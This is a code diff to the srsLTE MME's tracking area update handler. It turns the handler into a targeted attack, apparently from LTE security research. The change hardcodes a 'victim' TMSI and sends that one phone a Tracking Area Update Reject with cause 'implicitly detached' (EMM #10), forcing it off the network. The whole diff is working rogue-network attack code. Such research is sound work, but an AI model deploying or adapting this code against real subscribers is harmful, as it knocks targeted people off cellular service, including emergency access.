@@ -803,12 +803,16 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
 
   srslte::byte_buffer_t* nas_tx = pool->allocate();
-  // MODIFIED
+  // MODIFIED - send TAU Reject only to victim UE
   //nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
-  nas_log->console("Sending TAU Reject with EMM Message 7\n");
-  nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED); // EMM Message No.7
-  s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
-  pool->deallocate(nas_tx);
+  uint32_t victim_m_tmsi = 0xd8289a8d;
+  if(m_tmsi == victim_m_tmsi) {
+    nas_log->console("Check victim's TMSI\n");
+    nas_log->console("Sending TAU Reject with EMM Message 10\n");
+    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.10
+    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
+    pool->deallocate(nas_tx);
+  }
   return true;
 }
 
